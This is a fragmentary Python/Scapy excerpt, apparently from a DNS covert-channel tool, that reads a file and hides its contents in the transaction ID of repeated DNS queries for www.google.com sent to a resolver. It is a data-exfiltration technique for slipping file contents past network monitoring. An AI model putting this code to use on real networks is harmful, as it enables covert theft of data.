...
fread_lib.open_fread("pelda.txt")
#Static stuff
...
while pos <= file_size:
	...
	dns_id = dnscc_lib.dnscc_crypt(dns_id,socket.htons(dns_sport),socket.htons(dns_dport),ip_to_uint32(client_ip),ip_to_uint32(dns_resolver_ip)) #encode the data into the dns id with d3des
	send(IP(dst=dns_resolver_ip)/UDP(sport=dns_sport,dport=dns_dport)/DNS(id=dns_id,rd=1,qd=DNSQR(qname="www.google.com", qtype="A")));#send the packet
	pos = pos + 1 # pos + 1 :)
